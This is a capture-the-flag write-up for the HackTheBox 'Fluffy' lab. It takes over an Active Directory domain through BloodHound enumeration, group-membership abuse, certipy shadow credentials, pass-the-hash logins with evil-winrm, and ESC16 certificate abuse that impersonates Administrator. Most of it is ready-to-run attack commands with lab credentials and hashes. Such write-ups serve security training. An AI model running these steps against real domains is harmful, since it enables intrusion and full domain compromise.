Domain Enumeration

Lets get all available info about the domain and analyze it using bloodhound.

Firstly we run the bloodhound-python ingestor with the -all flag to perform all checks.

sudo bloodhound-python -u 'p.agila' -p 'prometheusx-303' -ns 10.129.62.146 -d fluffy.htb -c all

The results are in json files so we run the next command to put tham all in one zip file

zip -r fluffy_htb.zip *.json

Next we start the bloodhoud app:

bloodhound

After we uploaded the zip file or all the json files, we then type domain: in the search bar and select the fluffy.htb domain to perform analysis:

After going to the analysis tab and clicking Find Shortest Paths to Domain Admins , we see that there is a path from one of our owned users p.agila.

After more analysis, I found out that our user is part of the Service Account Managers group which has GenericAll privileges over the Service Accounts group.

The Service Account group has GenericWrite privileges over the members of that group, and one of the members namely ca_svc is a member of the Cert Publisher’s group. winrm_svc user is a part of the Remote Management Users.

Foothold

Using the GenericAll privilege, we add p.agilla to the Service Accounts group using the below command:

net rpc group addmem "Service Accounts" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "10.129.62.146"

Then we verify that the user was successfully added to the group:

net rpc group members "Service Accounts" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "10.129.62.146"

Then, as a member of the Service Accounts group, we should be able to add shadow credentials to the winrm_svc and ca_svc users to retrieve their RC4 password hash because of the GenericWrite privilege.

For this, we can use certipy.

Generating Hashes using Certipy

certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc -target-ip 10.129.62.146

Note: we might get an error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great), to fix this we run command:

sudo ntpdate <dc> #replace dc with ip

We repeat this for the remaining accounts as well. ldap_svc and winrm_svc

User Flag

We use the winrm_svc user account to get a shell on the host using evil-winrm.

evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i 10.129.62.146

Privilege Escalation/Root Flag

ADCS is installed on the Domain Controller. we should search for vulnerabilities using ca_svc’s creds and certipy tool:

I then googled ESC16 vulnerability and followed the step in the third article/blog:

Steps

Read upn for ca_svc

certipy account -u 'p.agila@fluffy.htb' -p prometheusx-303 -user ca_svc -dc-ip 10.129.232.88 read

Change ca_svc’s UPN to Administrator

certipy account -u 'p.agila@fluffy.htb' -p prometheusx-303 -upn administrator -user ca_svc -dc-ip 10.129.232.88 update

Request Certificate as Administrator

certipy-ad req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -ca 'FLUFFY-DC01-CA' -template 'User'

Restore ca_svc’s Original UPN

certipy account -u 'p.agila@fluffy.htb' -p prometheusx-303 -upn ca_svc -user ca_svc -dc-ip 10.129.232.88 update
certipy-ad auth -dc-ip 10.129.232.88 -pfx administrator.pfx -username administrator -domain 'fluffy.htb'

Log in and read root flag

evil-winrm -i 10.129.232.88 -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
